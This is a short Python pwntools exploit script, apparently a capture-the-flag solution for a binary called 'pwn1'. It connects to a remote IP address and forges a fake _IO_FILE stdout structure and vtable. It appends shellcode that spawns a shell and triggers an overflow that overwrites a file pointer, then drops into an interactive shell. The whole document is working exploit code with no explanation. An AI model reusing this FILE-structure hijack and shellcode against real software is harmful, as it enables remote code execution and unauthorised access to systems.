from pwn import *

context.binary = "./pwn1"
context.log_level="debug"

#p = process("./pwn1")
p = remote('47.106.243.235',8888)

p.recvuntil('format\n')
p.sendline('a')

fake_IO_stdout_addr = 0x0804A24C
fake_vtable = 0x0804A24C + 0x100 

fake_IO_stdout = p32(0xfbad8000) + p32(0x0804A44C)*8 + p32(0)*4
fake_IO_stdout += p32(0x0804A44C) + p32(1) + p32(0) + p32(0xffffffff)
fake_IO_stdout += p32(0) + p32(0x0804A44C) + p32(0xffffffff)*2
fake_IO_stdout += p32(0) + p32(0x0804A44C) + p32(0)*3
fake_IO_stdout += p32(0xffffffff) + p32(0)*10 + p32(fake_vtable)
fake_IO_stdout += p32(0x0804A44C) + p32(0x0804A44C)

fake_IO_stdout = fake_IO_stdout.ljust(0x100,'\x00')

payload = fake_IO_stdout + 'a'*28 + p32(0x0804A24C + 0x120) + asm(shellcraft.sh())


p.recvuntil('match\n')
p.sendline(payload)

p.recvuntil('?[Y/n]\n')
p.sendline('Y')

#gdb.attach(p)
p.recvuntil('format\n')
p.sendline('a'*0x49 + p32(fake_IO_stdout_addr))

p.interactive()

